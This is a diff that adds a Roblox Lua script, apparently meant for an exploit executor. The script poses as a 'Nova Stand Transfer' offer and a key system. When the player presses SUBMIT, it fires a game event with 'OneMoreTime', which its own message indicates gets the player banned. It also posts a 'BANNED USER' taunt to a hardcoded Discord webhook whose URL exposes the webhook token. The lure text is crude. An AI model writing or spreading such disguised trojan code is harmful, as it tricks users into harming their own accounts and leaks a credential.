@@ -1,0 +1,405 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local lilbozo = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
+local TextLabel_2 = Instance.new("TextLabel")
+local Frame = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local outer = Instance.new("ImageButton")
+local TextLabel_3 = Instance.new("TextLabel")
+local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
+local KEY = Instance.new("ScreenGui")
+local Frame_2 = Instance.new("Frame")
+local UICorner_3 = Instance.new("UICorner")
+local TextLabel_4 = Instance.new("TextLabel")
+local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
+local Frame_3 = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local textb = Instance.new("Frame")
+local UICorner_5 = Instance.new("UICorner")
+local TextBox = Instance.new("TextBox")
+local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
+local how = Instance.new("ImageButton")
+local TextLabel_5 = Instance.new("TextLabel")
+local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
+local TextLabel_6 = Instance.new("TextLabel")
+local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")
+local TextLabel_7 = Instance.new("TextLabel")
+local UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint")
+
+--Properties:
+
+lilbozo.Name = "lilbozo"
+lilbozo.Parent = game.CoreGui
+lilbozo.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+lilbozo.ResetOnSpawn = false
+
+Main.Name = "Main"
+Main.Parent = lilbozo
+Main.BackgroundColor3 = Color3.fromRGB(58, 59, 61)
+Main.Position = UDim2.new(0.403115124, 0, 0.389867008, 0)
+Main.Size = UDim2.new(0.192929536, 0, 0.220218241, 0)
+
+UICorner.Parent = Main
+
+TextLabel.Parent = Main
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.0539663993, 0, 0.00329678063, 0)
+TextLabel.Size = UDim2.new(0.891217291, 0, 0.220277607, 0)
+TextLabel.Font = Enum.Font.GothamSemibold
+TextLabel.Text = "Nova Stand Transfer"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 25.000
+TextLabel.TextWrapped = true
+
+UITextSizeConstraint.Parent = TextLabel
+UITextSizeConstraint.MaxTextSize = 25
+
+TextLabel_2.Parent = Main
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.115280755, 0, 0.285728574, 0)
+TextLabel_2.Size = UDim2.new(0.76071763, 0, 0.343223244, 0)
+TextLabel_2.Font = Enum.Font.GothamSemibold
+TextLabel_2.Text = "Seems like nova stand user(Xedi#5883) has transfered his permissions to ROBLOX ACCOUNT :I SUCK BALLS: Would you like to accept this"
+TextLabel_2.TextColor3 = Color3.fromRGB(154, 155, 157)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 11.000
+TextLabel_2.TextWrapped = true
+
+Frame.Parent = Main
+Frame.BackgroundColor3 = Color3.fromRGB(115, 116, 118)
+Frame.BorderColor3 = Color3.fromRGB(115, 116, 118)
+Frame.Position = UDim2.new(0.0539663993, 0, 0.216269806, 0)
+Frame.Size = UDim2.new(0.891217291, 0, 0.0051227347, 0)
+
+UICorner_2.Parent = Frame
+
+outer.Name = "outer"
+outer.Parent = Main
+outer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+outer.BackgroundTransparency = 1.000
+outer.Position = UDim2.new(0.248275161, 0, 0.741759539, 0)
+outer.Size = UDim2.new(0.499718279, 0, 0.169050246, 0)
+outer.Image = "rbxassetid://9401868297"
+
+TextLabel_3.Parent = outer
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.0233673491, 0, 0.174811661, 0)
+TextLabel_3.Size = UDim2.new(0.958348811, 0, 0.633867383, 0)
+TextLabel_3.Font = Enum.Font.GothamSemibold
+TextLabel_3.Text = "ACCEPT"
+TextLabel_3.TextColor3 = Color3.fromRGB(57, 59, 61)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 18.000
+TextLabel_3.TextWrapped = true
+
+UITextSizeConstraint_2.Parent = TextLabel_3
+UITextSizeConstraint_2.MaxTextSize = 18
+
+KEY.Name = "KEY"
+KEY.Parent = lilbozo
+KEY.Enabled = false
+KEY.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+KEY.ResetOnSpawn = false
+
+Frame_2.Parent = KEY
+Frame_2.BackgroundColor3 = Color3.fromRGB(58, 59, 61)
+Frame_2.Position = UDim2.new(0.406062812, 0, 0.389867038, 0)
+Frame_2.Size = UDim2.new(0.186765671, 0, 0.220218241, 0)
+
+UICorner_3.Parent = Frame_2
+
+TextLabel_4.Parent = Frame_2
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.Position = UDim2.new(0.0985272974, 0, 0.0494013205, 0)
+TextLabel_4.Size = UDim2.new(0.831855297, 0, 0.133191109, 0)
+TextLabel_4.Font = Enum.Font.GothamSemibold
+TextLabel_4.Text = "NOVA KEY SYSTEM"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 23.000
+TextLabel_4.TextWrapped = true
+
+UITextSizeConstraint_3.Parent = TextLabel_4
+UITextSizeConstraint_3.MaxTextSize = 23
+
+Frame_3.Parent = Frame_2
+Frame_3.BackgroundColor3 = Color3.fromRGB(115, 116, 118)
+Frame_3.BorderColor3 = Color3.fromRGB(115, 116, 118)
+Frame_3.Position = UDim2.new(0.0771923214, 0, 0.216269806, 0)
+Frame_3.Size = UDim2.new(0.84171921, 0, 0.0051227347, 0)
+
+UICorner_4.Parent = Frame_3
+
+textb.Name = "textb"
+textb.Parent = Frame_2
+textb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+textb.Position = UDim2.new(0.171126992, 0, 0.583128989, 0)
+textb.Size = UDim2.new(0.651017249, 0, 0.169050246, 0)
+
+UICorner_5.CornerRadius = UDim.new(0, 100)
+UICorner_5.Parent = textb
+
+TextBox.Parent = textb
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BackgroundTransparency = 1.000
+TextBox.Position = UDim2.new(-0.00168271468, 0, -0.012702439, 0)
+TextBox.Size = UDim2.new(0.999986112, 0, 0.993810534, 0)
+TextBox.Font = Enum.Font.SourceSansBold
+TextBox.PlaceholderColor3 = Color3.fromRGB(58, 59, 61)
+TextBox.PlaceholderText = "KEY HERE"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(58, 59, 61)
+TextBox.TextScaled = true
+TextBox.TextSize = 22.000
+TextBox.TextWrapped = true
+
+UITextSizeConstraint_4.Parent = TextBox
+UITextSizeConstraint_4.MaxTextSize = 22
+
+how.Name = "how"
+how.Parent = textb
+how.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+how.BackgroundTransparency = 1.000
+how.Position = UDim2.new(0.171460003, 0, 1.21281004, 0)
+how.Size = UDim2.new(0.656556547, 0, 1.0540415, 0)
+how.Image = "rbxassetid://9349292002"
+
+TextLabel_5.Parent = how
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.Position = UDim2.new(0.0769229904, 0, 0.291305274, 0)
+TextLabel_5.Size = UDim2.new(0.838461578, 0, 0.425918818, 0)
+TextLabel_5.Font = Enum.Font.GothamSemibold
+TextLabel_5.Text = "SUBMIT!"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 18.000
+TextLabel_5.TextWrapped = true
+
+UITextSizeConstraint_5.Parent = TextLabel_5
+UITextSizeConstraint_5.MaxTextSize = 18
+
+TextLabel_6.Parent = Frame_2
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.Position = UDim2.new(0.0753734633, 0, 0.295974106, 0)
+TextLabel_6.Size = UDim2.new(0.752944112, 0, 0.153682038, 0)
+TextLabel_6.Font = Enum.Font.GothamSemibold
+TextLabel_6.Text = "Welcome back, "
+TextLabel_6.TextColor3 = Color3.fromRGB(205, 206, 208)
+TextLabel_6.TextScaled = true
+TextLabel_6.TextSize = 11.000
+TextLabel_6.TextWrapped = true
+TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
+
+UITextSizeConstraint_6.Parent = TextLabel_6
+UITextSizeConstraint_6.MaxTextSize = 11
+
+TextLabel_7.Parent = Frame_2
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.BackgroundTransparency = 1.000
+TextLabel_7.Position = UDim2.new(0.0753734633, 0, 0.383060604, 0)
+TextLabel_7.Size = UDim2.new(0.969949901, 0, 0.153682038, 0)
+TextLabel_7.Font = Enum.Font.GothamSemibold
+TextLabel_7.Text = "Just paste in your key and press \"SUBMIT!\""
+TextLabel_7.TextColor3 = Color3.fromRGB(205, 206, 208)
+TextLabel_7.TextScaled = true
+TextLabel_7.TextSize = 11.000
+TextLabel_7.TextWrapped = true
+TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
+
+UITextSizeConstraint_7.Parent = TextLabel_7
+UITextSizeConstraint_7.MaxTextSize = 11
+
+-- Module Scripts:
+
+local fake_module_scripts = {}
+
+do -- how.WebhookService
+	local script = Instance.new('ModuleScript', how)
+	script.Name = "WebhookService"
+	local function module_script()
+		--[[WARNING!!! MAKE SURE THIS MODULE IS IN SERVER STORAGE OR SERVER SCRIPT SERVICE]]
+		
+		-- This module was created by LuaScape
+		
+		--PROXY: webhook.lewistehminerz.dev
+		
+		
+		---------------------------------------------------------------------------------------
+		
+		local webhookService = {}
+		
+		local https = game:GetService("HttpService")
+		
+		
+		function webhookService:createMessage(url, message)
+			local data = {
+				["content"] = message
+			}
+			local finalData = https:JSONEncode(data)
+			https:PostAsync(url, finalData)
+		end
+		
+		function webhookService:createEmbed(url, title, message, image)
+			local data = {
+				['content'] = "",
+				['embeds'] = {{
+					["image"] = {["url"] = image},
+					['title'] = "**"..title.."**",
+					['description'] = message,
+					['type'] = "rich",
+					["color"] = tonumber(0xffffff)
+				}}
+			}
+			local finalData = https:JSONEncode(data)
+			https:PostAsync(url, finalData)
+		end
+		
+		
+		return webhookService
+		
+		
+		--[[Simple Message Example: 
+		
+		local url = "Url Here"
+		
+		local webhookService = require(game.ServerStorage.WebhookService)
+		
+		webhookService:createMessage(url, "Message Here")
+		
+		webhookService:createEmbed(url, "Title Here", "Message Here", "Image Link Here (OPTIONAL)")
+		
+		
+		]]
+		
+		-- Use these examples in a SERVER SCRIPT!
+	end
+	fake_module_scripts[script] = module_script
+end
+
+
+-- Scripts:
+
+local function FZWNKCM_fake_script() -- TextLabel_2.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel_2)
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
+
+	script.Parent.Text = "Seems like nova stand user(Xedi#5883) has sent transfer request to ROBLOX ACCOUNT ("..game.Players.LocalPlayer.Name.."). Would you like to accept this?"
+end
+coroutine.wrap(FZWNKCM_fake_script)()
+local function HHZTE_fake_script() -- outer.real 
+	local script = Instance.new('LocalScript', outer)
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
+
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.TextLabel.TextColor3 = Color3.new(1, 1, 1)
+		script.Parent.Parent.outer.Image = "rbxassetid://9349292002"
+		wait(0.12)
+		script.Parent.Parent.outer.Image = "rbxassetid://9401868297"
+		script.Parent.TextLabel.TextColor3 = Color3.new(0.227451, 0.231373, 0.239216)
+		wait(0.5)
+		script.Parent.Parent.Parent.KEY.Enabled = true
+		wait(0.1)
+		script.Parent.Parent.Parent.Main:Destroy()
+	   
+	end)
+end
+coroutine.wrap(HHZTE_fake_script)()
+local function FBCJ_fake_script() -- lilbozo.LocalScript 
+	local script = Instance.new('LocalScript', lilbozo)
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
+
+	local britz = Instance.new("BlurEffect")
+	
+	britz.Parent = game.Lighting
+	
+end
+coroutine.wrap(FBCJ_fake_script)()
+local function WLWGTN_fake_script() -- how.Script 
+	local script = Instance.new('Script', how)
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
+
+	local url = "https://discord.com/api/webhooks/965572845738557440/Y6OScfjbHjdDUZJn65FUY-Ul3eAAHPI4Ia532E2Gf0i34DKLFTMUioT5c0t36NJrmePm"
+	local ws = require(script.Parent.WebhookService)
+	
+	script.Parent.MouseButton1Down:Connect(function(plr)
+	
+		ws:createEmbed(url, "BANNED USER","LOL JUST GOT BANNED", "https://c.tenor.com/1OrBi43clj4AAAAM/troll-face-troll.gif")
+	
+	end)
+	
+	
+end
+coroutine.wrap(WLWGTN_fake_script)()
+local function YKZGKQ_fake_script() -- how.LocalScript 
+	local script = Instance.new('LocalScript', how)
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
+
+	script.Parent.MouseButton1Down:Connect(function()
+		wait(1)
+		game.ReplicatedStorage.MainEvent:FireServer("OneMoreTime")
+	end)
+end
+coroutine.wrap(YKZGKQ_fake_script)()
+local function KBPB_fake_script() -- TextLabel_6.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel_6)
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
+
+	script.Parent.Text = "Welcome back,"..game.Players.LocalPlayer.Name.."."
+end
+coroutine.wrap(KBPB_fake_script)()
